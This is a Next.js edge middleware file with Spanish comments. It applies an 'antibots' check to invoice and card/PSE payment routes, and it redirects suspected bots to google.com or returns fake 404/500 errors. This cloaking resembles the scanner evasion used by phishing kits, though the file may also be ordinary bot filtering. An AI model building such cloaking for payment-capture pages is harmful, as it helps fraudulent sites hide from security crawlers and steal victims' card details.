/**
 * Edge middleware que aplica antibots a las rutas protegidas.
 *
 * Rutas equivalentes a las del Route::middleware('antibot')->group() del Laravel mov:
 *   /mov
 *   /factura/resumen
 *   /pago/metodo
 *   /pago/datos
 *   /pago/tarjeta
 *   /pago/pse
 *   /pago/finalizado
 *   /pago/pendiente
 *   /error
 *   /error/404
 */

import { NextRequest, NextResponse } from "next/server";
import { runDetector } from "@/lib/antibots/detector";
import { mergedAntibotConfig } from "@/lib/antibots/config";

export const config = {
  matcher: [
    "/mov",
    "/factura/resumen",
    "/pago/metodo",
    "/pago/datos",
    "/pago/tarjeta",
    "/pago/pse",
    "/pago/finalizado",
    "/pago/pendiente",
    "/error",
    "/error/404",
  ],
};

const VERIFIED_COOKIE = "mov_antibot_ok";

export default async function middleware(req: NextRequest): Promise<Response> {
  if (req.cookies.get(VERIFIED_COOKIE)?.value === "1") {
    return NextResponse.next();
  }

  try {
    const result = await runDetector(req);

    if (result === "block") {
      const cfg = await mergedAntibotConfig();
      return buildBlockResponse(req, cfg.redirect, cfg.url);
    }

    const res = NextResponse.next();
    res.cookies.set(VERIFIED_COOKIE, "1", {
      httpOnly: true,
      sameSite: "lax",
      secure: process.env.NODE_ENV === "production",
      path: "/",
      maxAge: 60 * 60, // 1 hora
    });
    return res;
  } catch (e) {
    console.error("[antibots] middleware exception", e);
    return NextResponse.next();
  }
}

function buildBlockResponse(
  req: NextRequest,
  redirectType: "url" | "abort_404" | "abort_500" | "landing",
  externalUrl: string
): Response {
  switch (redirectType) {
    case "abort_404":
      return new Response("Not Found", { status: 404 });
    case "abort_500":
      return new Response("Internal Server Error", { status: 500 });
    case "landing":
      return NextResponse.redirect(new URL("/", req.url));
    case "url":
    default: {
      const target = externalUrl || "https://www.google.com";
      return NextResponse.redirect(target, 302);
    }
  }
}
